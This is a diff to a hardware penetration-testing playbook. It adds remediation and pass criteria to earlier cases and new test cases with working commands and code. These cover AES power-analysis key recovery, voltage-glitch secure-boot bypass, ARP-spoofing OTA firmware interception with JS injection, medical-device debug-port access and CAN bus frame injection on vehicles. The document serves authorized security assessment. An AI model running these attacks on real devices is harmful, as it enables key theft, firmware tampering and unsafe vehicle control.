@@ -14,6 +14,11 @@
 - [TC-HS-003: JTAG Debug Port Access and Memory Dump](#tc-hs-003-jtag-debug-port-access-and-memory-dump)
 - [TC-HS-004: Firmware Secrets and Credential Extraction](#tc-hs-004-firmware-secrets-and-credential-extraction)
 - [TC-HS-005: RFID Card Cloning Attack](#tc-hs-005-rfid-card-cloning-attack)
+- [TC-HS-006: Side-Channel Power Analysis on AES Implementation](#tc-hs-006-side-channel-power-analysis-on-aes-implementation)
+- [TC-HS-007: Fault Injection via Voltage Glitching](#tc-hs-007-fault-injection-via-voltage-glitching)
+- [TC-HS-008: IoT Device Firmware Over-The-Air Intercept](#tc-hs-008-iot-device-firmware-over-the-air-intercept)
+- [TC-HS-009: Hardware Debug Interface Enumeration on Medical Device](#tc-hs-009-hardware-debug-interface-enumeration-on-medical-device)
+- [TC-HS-010: CAN Bus Sniffing and Injection on Automotive ECU](#tc-hs-010-can-bus-sniffing-and-injection-on-automotive-ecu)
 
 ---
 
@@ -66,6 +71,15 @@
 - Run `id` in obtained shell — output must show `uid=0(root)` for Critical-severity finding.
 - Run `cat /proc/version` to confirm kernel version for additional CVE research.
 - Confirm no authentication was required between UART connection and root shell.
+
+**Remediation**: Disable or physically obscure UART headers on production devices; enforce authentication on all debug consoles; remove root login or require strong passwords; configure U-Boot with bootdelay=0 and password protection.
+
+**Pass Criteria**:
+- [ ] UART TX pin identified with stable 3.3 V idle reading
+- [ ] Boot log captured at correct baud rate with readable ASCII output
+- [ ] Root shell or login prompt obtained without authentication
+- [ ] `id` command returns `uid=0(root)`
+- [ ] `/etc/passwd` and `/etc/shadow` contents documented
 
 **Severity**: Critical
 
@@ -125,6 +139,15 @@
 - `binwalk /tmp/dump1.bin | grep -i 'squashfs\|jffs2\|cramfs\|ext2'` — must find at least one filesystem.
 - `ls /tmp/firmware-extracted/` — must contain subdirectories or image files.
 
+**Remediation**: Disable in-circuit programming on production devices via efuse or lock bits; encrypt firmware stored in flash; use secure boot to verify firmware integrity at startup; epoxy or shield flash chips to deter physical access.
+
+**Pass Criteria**:
+- [ ] flashrom detects and reports correct chip make/model
+- [ ] Three sequential reads produce identical MD5 hashes
+- [ ] binwalk identifies at least one embedded filesystem (squashfs, jffs2, cramfs, ext2)
+- [ ] Extracted directory contains 100+ files
+- [ ] SHA256 hash of final dump recorded for evidence chain
+
 **Severity**: High
 
 **Phase**: Phase 3 — Firmware Extraction
@@ -183,6 +206,16 @@
 - `ls -lh /tmp/jtag-memory.bin` — file size matches requested dump size (512 KB in this case).
 - `strings /tmp/jtag-memory.bin | head -30` — readable ASCII strings confirm real firmware content.
 - CPU resumes cleanly after `resume` — device did not crash from JTAG interaction.
+
+**Remediation**: Disable JTAG/SWD interfaces in production via efuse or firmware configuration; enable JTAG lockout after initial programming; use hardware security modules (HSMs) for key storage; enforce read-out protection (RDP) on ARM Cortex devices.
+
+**Pass Criteria**:
+- [ ] JTAGulator identifies TCK/TMS/TDI/TDO pin assignments
+- [ ] OpenOCD connects and reports "Examined ARM core"
+- [ ] CPU halts and resumes cleanly without device crash
+- [ ] CPU register values readable via `reg` command
+- [ ] Memory dump file non-empty and matches requested size
+- [ ] binwalk or strings finds readable content in dump
 
 **Severity**: Critical
 
@@ -262,6 +295,15 @@
 - Cross-reference any found credentials against device's web interface or SSH: attempt login.
 - Verify password hashes crack successfully against common wordlists.
 - Confirm telnetd/ftpd services confirmed running by connecting to device IP post-boot.
+
+**Remediation**: Remove hardcoded credentials from firmware images; store secrets in secure elements or TPMs; use encrypted filesystems for sensitive configuration; disable telnetd/ftpd and use SSH with key-based auth only; implement firmware encryption and obfuscation to raise extraction cost.
+
+**Pass Criteria**:
+- [ ] `/etc/passwd` and `/etc/shadow` readable with documented user accounts
+- [ ] At least one hardcoded password found in configuration files
+- [ ] At least one private key or certificate found in filesystem
+- [ ] Network service configurations documented (telnetd, ftpd, sshd)
+- [ ] firmwalker report generated with all findings catalogued
 
 **Severity**: Critical (likely to find at minimum High-severity issues in consumer firmware)
 
@@ -352,6 +394,325 @@
 - Present cloned card to reader a minimum of 3 times to confirm consistent access grant.
 - Confirm original card still works (cloning does not destroy the original).
 
+**Remediation**: Upgrade from EM4100 to encrypted card protocols (MIFARE DESFire, SEOS); deploy card readers that validate cryptographic challenges rather than relying on static UIDs; implement additional authentication factors (PIN, biometric); enable card-to-reader mutual authentication.
+
+**Pass Criteria**:
+- [ ] Target card type and UID successfully identified
+- [ ] EM4100 ID read or MIFARE autopwn completed with all sectors decrypted
+- [ ] Cloned card programmed and verified with matching UID
+- [ ] Cloned card accepted by access reader on 3+ consecutive attempts
+- [ ] Original card confirmed still functional after cloning
+
 **Severity**: Critical (access control bypass without cryptographic attack)
 
 **Phase**: Phase 5 — Exploitation
+
+---
+
+## TC-HS-006: Side-Channel Power Analysis on AES Implementation
+
+**Objective**: Capture power consumption traces from a target microcontroller during AES encryption operations and use Correlation Power Analysis (CPA) to recover the secret key, demonstrating that power side-channels enable key extraction without invasive attacks.
+
+**Severity**: Critical
+
+**Prerequisites**:
+- Target device with known AES-128 implementation running on an 8-bit or 32-bit microcontroller
+- ChipWhisperer-Lite or ChipWhisperer-Pro connected to Kali host
+- ChipWhisperer software installed: `pip install chipwhisperer`
+- Target firmware configured to accept plaintext input and perform AES encryption on demand
+- oscilloscope calibration completed and trigger signal identified
+
+**Steps**:
+1. Connect ChipWhisperer to target device: measure shunt resistor voltage on VCC line; connect trigger GPIO to capture scope.
+2. Open ChipWhisperer Capture software and configure ADC clock to match target clock frequency (typically 7.37 MHz for XMEGA targets).
+3. Program target with AES test firmware if not already present.
+4. Acquire 5,000 to 10,000 power traces with random plaintext inputs:
+   ```python
+   import chipwhisperer as cw
+   scope = cw.scope()
+   target = cw.target(scope)
+   scope.adc.samples = 2400
+   scope.adc.offset = 0
+   ktp = cw.ktp.Basic()
+   trace_array = []
+   textin_array = []
+   for i in range(5000):
+       key, text = ktp.next()
+       trace = cw.capture_trace(scope, target, text, key)
+       if trace:
+           trace_array.append(trace)
+           textin_array.append(text)
+   ```
+5. Run Correlation Power Analysis using Hamming weight leakage model:
+   ```python
+   import chipwhisperer.analyzer as cwa
+   attack = cwa.CPA()
+   attack.set_analysis_algorithm(cwa.leakage_models.sbox_output_leakage)
+   results = attack.run(trace_array)
+   ```
+6. Inspect correlation output for each key byte: the highest-correlation hypothesis should match the actual key byte.
+7. Validate recovered key by encrypting a known plaintext and comparing output.
+
+**Expected**:
+| Check | Expected Finding | Severity if Found |
+|-------|-----------------|-------------------|
+| Power traces captured | 5,000+ clean traces with visible AES round structure | High |
+| CPA recovers key bytes | All 16 key bytes recovered with >0.9 correlation | Critical |
+| Key validated | Recovered key produces correct ciphertext for test inputs | Critical |
+| Attack requires <10k traces | Full key recovery economically feasible | High |
+
+**Remediation**: Implement constant-time AES implementations that avoid key-dependent memory accesses; use hardware AES accelerators with built-in DPA countermeasures; apply masking schemes to randomize intermediate values; add random delays and dummy operations to increase trace count requirements.
+
+**Pass Criteria**:
+- [ ] 5,000+ power traces captured with clean trigger alignment
+- [ ] CPA correlation plots show clear peaks for all 16 key bytes
+- [ ] At least 14 of 16 key bytes recovered with >0.8 correlation coefficient
+- [ ] Recovered key validated against known plaintext/ciphertext pair
+
+---
+
+## TC-HS-007: Fault Injection via Voltage Glitching
+
+**Objective**: Bypass secure boot verification or authentication checks on a target microcontroller by injecting precise voltage glitches during critical instruction execution, causing the processor to skip security-critical branch instructions.
+
+**Severity**: Critical
+
+**Prerequisites**:
+- ChipWhisperer-Lite or custom glitch hardware connected to Kali host
+- Target microcontroller with secure boot or authentication mechanism (ARM Cortex-M, STM32, or similar)
+- Target firmware analyzed to identify approximate glitch window (instruction timing from reset vector or authentication check)
+- ChipWhisperer glitch module configured with appropriate shunt resistor
+
+**Steps**:
+1. Analyze target firmware to identify the authentication check or secure boot verification routine. Determine the approximate clock cycle count from reset or trigger to the branch instruction.
+2. Set up ChipWhisperer for voltage glitching:
+   ```python
+   import chipwhisperer as cw
+   scope = cw.scope()
+   scope.glitch.clk_src = "clkgen"
+   scope.glitch.output = "glitch_only"
+   scope.glitch.trigger_src = "ext_trigger"
+   scope.glitch.repeat = 1
+   scope.glitch.width = 10
+   scope.glitch.offset = 0
+   ```
+3. Run parameter sweep over glitch offset and width:
+   ```python
+   for offset in range(-20, 20):
+       for width in range(1, 15):
+           scope.glitch.offset = offset
+           scope.glitch.width = width
+           # Reset target and trigger glitch
+           target.reset()
+           response = target.read()
+           if "authentication bypassed" in response.lower() or "root" in response.lower():
+               print(f"GLITCH SUCCESS: offset={offset}, width={width}")
+   ```
+4. Document successful glitch parameters (offset, width, repeat count).
+5. Repeat successful glitch 10 times to measure reliability percentage.
+6. If secure boot is bypassed, dump the device memory using the glitched state.
+
+**Expected**:
+| Check | Expected Finding | Severity if Found |
+|-------|-----------------|-------------------|
+| Glitch parameters found | Specific offset/width combination bypasses check | Critical |
+| Authentication bypassed | Device grants access without valid credentials | Critical |
+| Secure boot skipped | Device boots unsigned/modified firmware | Critical |
+| Reliability >30% | Attack is repeatable and practical | High |
+
+**Remediation**: Implement multiple redundant security checks rather than a single branch instruction; use glitch detectors that monitor voltage and clock integrity; deploy hardware glitch detection circuits; use lock-step processor cores to compare results; implement firmware execution from encrypted storage.
+
+**Pass Criteria**:
+- [ ] At least one offset/width combination causes observable fault in execution flow
+- [ ] Authentication or secure boot check bypassed with documented parameters
+- [ ] Successful glitch repeatable with >20% reliability over 10 attempts
+- [ ] Device memory accessible after successful glitch
+
+---
+
+## TC-HS-008: IoT Device Firmware Over-The-Air Intercept
+
+**Objective**: Intercept an over-the-air (OTA) firmware update from an IoT device by performing a man-in-the-middle attack on the update channel, capture the firmware binary, and verify whether the update is transmitted without encryption or integrity protection.
+
+**Severity**: High
+
+**Prerequisites**:
+- IoT device configured to check for and download firmware updates
+- Network access on the same LAN segment as the target device (or ability to ARP poison)
+- Wireshark and mitmproxy installed on Kali host
+- DNS or HTTP interception capability (dnsspoof, Bettercap, or burp proxy)
+- Known update server URL or ability to discover it via traffic analysis
+
+**Steps**:
+1. Identify the update mechanism: start Wireshark capture on the interface connected to the target device LAN.
+   ```bash
+   sudo wireshark -i eth0 -k -f "host <target-device-ip>"
+   ```
+2. Trigger firmware update check on the IoT device (via app, button, or scheduled update).
+3. Analyze captured traffic: identify the update server URL, protocol (HTTP/HTTPS), and update request format.
+4. If HTTPS is used, test for certificate pinning:
+   ```bash
+   # ARP spoof to position as MITM
+   sudo arpspoof -i eth0 -t <target-device-ip> <gateway-ip>
+   # Run mitmproxy with custom certificate
+   mitmproxy --mode transparent --ssl-insecure
+   ```
+5. If certificate validation is weak, intercept and capture the firmware download.
+6. If HTTP is used, intercept directly:
+   ```bash
+   bettercap -T <target-device-ip> -X --proxy --proxy-module injectjs
+   ```
+7. Save the intercepted firmware binary: extract from mitmproxy or Wireshark stream.
+8. Analyze the captured firmware: check for encryption, signatures, or integrity hashes.
+   ```bash
+   binwalk intercepted_firmware.bin
+   openssl dgst -sha256 intercepted_firmware.bin
+   ```
+9. Attempt to modify the firmware, repackage, and serve the modified version to test if the device accepts tampered updates.
+
+**Expected**:
+| Check | Expected Finding | Severity if Found |
+|-------|-----------------|-------------------|
+| Update traffic captured | Firmware download URL and protocol identified | High |
+| No TLS/encryption | Firmware transmitted over plaintext HTTP | Critical |
+| Certificate pinning absent | MITM succeeds with self-signed certificate | Critical |
+| Firmware unencrypted | binwalk extracts readable filesystem from OTA payload | Critical |
+| Modified firmware accepted | Device installs tampered firmware image | Critical |
+
+**Remediation**: Enforce TLS with certificate pinning for all firmware update channels; sign firmware images with a secure key stored in a hardware security module; verify firmware signature on-device before installation; use encrypted firmware containers; implement rollback protection.
+
+**Pass Criteria**:
+- [ ] OTA update request and response traffic captured and analyzed
+- [ ] Update server URL, protocol, and request format documented
+- [ ] Encryption status of firmware download determined (encrypted or plaintext)
+- [ ] Firmware binary extracted and analyzed with binwalk
+- [ ] Integrity/signature verification status confirmed
+
+---
+
+## TC-HS-009: Hardware Debug Interface Enumeration on Medical Device
+
+**Objective**: Systematically enumerate all hardware debug interfaces on a medical device PCB (SWD, JTAG, UART, I2C, SPI), document which interfaces are active and accessible, and determine which provide unauthorized access to patient data or device configuration.
+
+**Severity**: Critical
+
+**Prerequisites**:
+- Medical device with written authorization for security assessment
+- Device powered and operational in a test environment (not connected to patients)
+- PCB accessible with all connectors and test points identified via high-resolution PCB photographs
+- JTAGulator, multimeter, logic analyzer, and USB-to-UART adapters available
+- Safety approval from facility biomedical engineering department
+
+**Steps**:
+1. Photograph the PCB at high resolution (both sides). Label all headers, test points, and unpopulated pads.
+2. Use multimeter to identify power rails (3.3V, 5V, 1.8V) and GND pins on all headers.
+3. Identify UART interfaces: probe remaining pins for idle voltage levels (TX holds 3.3V, RX floats).
+4. Test each UART candidate at common baud rates (115200, 57600, 38400, 9600, 4800):
+   ```bash
+   for baud in 115200 57600 38400 9600; do
+     echo "Testing baud: $baud"
+     picocom -b $baud /dev/ttyUSB0 | tee /tmp/uart-${baud}.log &
+     sleep 3 && kill %1
+   done
+   ```
+5. Connect JTAGulator to all unidentified multi-pin headers and run JTAG scan:
+   ```
+   JTAGulator> J
+   ```
+6. Connect logic analyzer to I2C and SPI bus candidates; capture bus traffic during device operation.
+7. For each discovered interface, document:
+   - Interface type, pinout, and location on PCB
+   - Active/inactive status (does it respond to communication?)
+   - Data accessible (boot logs, configuration, patient data, calibration settings)
+8. Attempt to access patient data storage via any active debug interface.
+9. Document all findings with interface maps and screenshot evidence.
+
+**Expected**:
+| Check | Expected Finding | Severity if Found |
+|-------|-----------------|-------------------|
+| UART interfaces found | At least one UART provides boot log or console | High |
+| JTAG/SWD accessible | Debug port allows CPU halt and memory access | Critical |
+| I2C/SPI bus traffic captured | Patient configuration or calibration data on bus | High |
+| Unauthenticated console access | Shell access without password on UART | Critical |
+| Patient data accessible | Protected health information readable via debug port | Critical |
+
+**Remediation**: Disable all debug interfaces on production medical devices via efuse or firmware configuration; implement physical tamper detection that erases sensitive data on case opening; encrypt patient data at rest and in transit on internal buses; comply with IEC 62304 and FDA cybersecurity guidance for medical device development.
+
+**Pass Criteria**:
+- [ ] All headers and test points on PCB documented with photographs
+- [ ] UART interfaces tested at all common baud rates
+- [ ] JTAGulator scan completed on all multi-pin headers
+- [ ] I2C/SPI traffic captured and decoded with logic analyzer
+- [ ] Each discovered interface classified as active/inactive with accessible data documented
+
+---
+
+## TC-HS-010: CAN Bus Sniffing and Injection on Automotive ECU
+
+**Objective**: Connect to the CAN bus of a target vehicle's electronic control unit (ECU), capture and decode CAN frames to understand message structure, and demonstrate the ability to inject arbitrary CAN frames that affect vehicle behavior (door locks, instrument cluster, or other non-safety-critical systems).
+
+**Severity**: Critical
+
+**Prerequisites**:
+- Target vehicle with OBD-II port accessible (test vehicle owned or with explicit written authorization)
+- CANable, PCAN-USB, or SocketCAN-compatible adapter connected to Kali host
+- can-utils installed: `sudo apt-get install can-utils`
+- Vehicle ignition in ON position (engine may be off for safety)
+- Test plan reviewed and approved, limiting injection to non-safety-critical systems only
+
+**Steps**:
+1. Connect CAN adapter to OBD-II port (pin 6 = CAN-High, pin 14 = CAN-Low).
+2. Configure SocketCAN interface:
+   ```bash
+   sudo ip link set can0 type can bitrate 500000
+   sudo ip link set up can0
+   ```
+3. Capture raw CAN traffic:
+   ```bash
+   candump can0 -t a -c can_capture.log
+   ```
+4. While capturing, perform specific vehicle actions to correlate CAN IDs with functions:
+   - Lock/unlock doors (each action 3 times)
+   - Turn on/off headlights
+   - Press brake pedal
+   - Roll down/up windows
+5. Analyze captured traffic to identify message patterns:
+   ```bash
+   # Identify unique CAN IDs
+   cat can_capture.log | awk '{print $3}' | sort -u
+   # Find messages that appear only during door lock
+   cansniffer can0 -c can_sniff.log
+   ```
+6. Replay captured frames to verify vehicle response:
+   ```bash
+   # Replay door lock frame
+   cansend can0 123#0102030405060708
+   ```
+7. For identified functions, test modified payloads:
+   ```bash
+   # Brute-force specific byte positions for door unlock
+   for i in $(seq 0 255); do
+     cansend can0 123#$(printf '%02x' $i)02030405060708
+     sleep 0.1
+   done
+   ```
+8. Document all successful CAN ID and payload combinations.
+9. Verify that injected frames produce the expected physical response in the vehicle.
+
+**Expected**:
+| Check | Expected Finding | Severity if Found |
+|-------|-----------------|-------------------|
+| CAN traffic captured | Valid CAN frames decoded at 500 kbps | High |
+| Message-function mapping | CAN IDs correlated with door lock, lights, windows | Critical |
+| Frame replay succeeds | Replayed CAN frame produces same vehicle response | Critical |
+| Arbitrary injection works | Modified payload changes vehicle behavior | Critical |
+| No authentication on bus | CAN frames accepted without source validation | Critical |
+
+**Remediation**: Implement message authentication codes (MAC) on CAN bus messages using AUTOSAR SecOC; deploy CAN bus encryption for critical messages; use gateway ECUs to validate and filter messages between bus segments; implement intrusion detection systems (IDS) on the CAN bus; migrate to CAN-FD or Ethernet-based architectures with built-in security.
+
+**Pass Criteria**:
+- [ ] CAN bus traffic captured and decoded at correct bitrate
+- [ ] At least 3 CAN IDs correlated with specific vehicle functions
+- [ ] Replayed CAN frames produce the same physical response as original
+- [ ] At least one injected modified payload produces observable vehicle behavior change
+- [ ] No message authentication detected on any CAN frame
